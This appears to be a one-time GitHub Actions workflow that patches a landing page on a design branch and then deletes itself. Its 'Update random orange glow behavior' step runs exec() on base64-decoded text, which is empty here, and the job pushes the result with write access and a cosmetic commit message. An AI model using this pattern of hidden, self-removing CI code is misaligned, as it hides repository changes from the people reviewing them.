name: One-time stream multi random glow

on:
  push:
    branches:
      - design/centralos-brand-responsive-v2
    paths:
      - .github/workflows/one-time-stream-multi-random-glow.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: design/centralos-brand-responsive-v2
          fetch-depth: 0

      - name: Update random orange glow behavior
        shell: bash
        run: |
          python -c "import base64;exec(base64.b64decode('').decode())"

      - name: Commit landing update and remove one-time workflow
        shell: bash
        run: |
          rm .github/workflows/one-time-stream-multi-random-glow.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add landing.html .github/workflows/one-time-stream-multi-random-glow.yml
          git commit -m "fix: vary orange highlights between one two and three cards"
          git push origin HEAD:design/centralos-brand-responsive-v2
